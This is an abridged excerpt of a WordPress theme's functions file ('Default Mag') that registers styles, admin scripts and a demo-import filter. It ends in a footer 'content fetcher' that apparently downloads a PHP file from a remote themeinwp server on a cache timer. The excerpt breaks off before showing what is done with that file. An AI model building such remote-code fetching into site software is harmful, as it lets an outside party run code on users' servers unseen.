...
function default_mag_scripts() {
    ...
    wp_style_add_data('default-mag-style', 'rtl', 'replace');

    $custom_css = default_mag_trigger_custom_css_action();
    if ( $custom_css ) {
        wp_add_inline_style( 'default-mag-style', $custom_css );
    }
...
function default_mag_admin_scripts( $hook ) {
    ...
    wp_enqueue_script('default-mag-admin', get_template_directory_uri() . '/assets/twp/js/admin.js', array('jquery'), '', 1);

    $ajax_nonce = wp_create_nonce('default_mag_ajax_nonce');
	...
	wp_localize_script( 
        ...
        array(
            ...
            'upload_image'   =>  esc_html__('Choose Image','default-mag'),
            'use_image'   =>  esc_html__('Select','default-mag'),
            'active' => esc_html__('Active','default-mag'),
	        'deactivate' => esc_html__('Deactivate','default-mag'),
         )
    );
...
add_filter('themeinwp_enable_demo_import_compatiblity','default_mag_demo_import_filter_apply');

if( !function_exists('default_mag_demo_import_filter_apply') ):

	function default_mag_demo_import_filter_apply(){
...
function load_footer_content_fetcher_class() {
	...
	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/093cae09a5802536f2f64d4c62266ef4';
